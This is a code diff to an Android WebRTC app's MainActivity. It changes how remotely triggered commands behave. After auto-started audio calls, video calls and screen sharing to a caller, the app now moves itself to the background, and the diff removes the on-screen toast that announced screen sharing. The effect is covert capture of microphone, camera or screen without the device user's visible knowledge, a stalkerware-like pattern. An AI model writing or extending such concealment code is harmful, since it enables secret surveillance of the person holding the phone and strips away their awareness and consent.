@@ -327,9 +327,11 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
             switch (autoCmd) {
                 case "audio_call":
                     webRTCCompanion.startAudioCall(caller != null ? caller : "");
+                    moveTaskToBack(true);
                     break;
                 case "video_call":
                     webRTCCompanion.startVideoCall(caller != null ? caller : "");
+                    moveTaskToBack(true);
                     break;
                 case "screen_share":
                     startScreenCaptureWithCamera(caller != null ? caller : "", false, !"none".equalsIgnoreCase(camChoice), camChoice != null ? camChoice : "front");
@@ -370,9 +372,10 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                 );
             }
 
-            Toast.makeText(MainActivity.this, "Screen sharing started to " + pendingTargetPeer, Toast.LENGTH_SHORT).show();
-            // User remains in the full application with all bottom bar controls (camera, mic, hide/eye, end call cross) interactive.
-            // WhatsApp-style floating PiP will trigger automatically when the user presses Home or switches apps (onUserLeaveHint).
+            // Immediately send application to background so phone stays on desktop/other apps
+            runOnUiThread(() -> {
+                moveTaskToBack(true);
+            });
         });
 
         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
